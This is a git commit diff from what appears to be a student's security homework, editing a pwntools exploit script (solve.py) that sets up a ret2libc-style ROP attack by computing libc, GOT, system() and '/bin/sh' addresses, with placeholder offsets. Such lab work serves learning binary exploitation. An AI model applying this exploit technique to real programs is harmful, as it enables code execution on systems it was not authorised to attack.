0affbe9f8f6f86831c10d23378838ac95a1b7343
Alfons0329 <alfons.cs04@g2.nctu.edu.tw>
2019-12-06 15:16:22 +0800

    Doing Hw0x07

--- Hw0x07/solve.py
+++ Hw0x07/solve.py
@@ -1,4 +1,7 @@
 # Please run with python2.7 for better compatibility
+'''
+0000000000601ff0 R_X86_64_GLOB_DAT  __libc_start_main@GLIBC_2.2.5
+'''
 from pwn import *
 
 context.clear(arch='x86_64')
@@ -14,6 +17,8 @@ p.close()
 
 # calculate offset for system library
 # ROP gadgets
+libc = 0x6060f0
+libc_start_main_got = 0x601ff0
 system_offset = 123
 system_func_ptr = libc + system_offset
 bin_sh = libc + 123
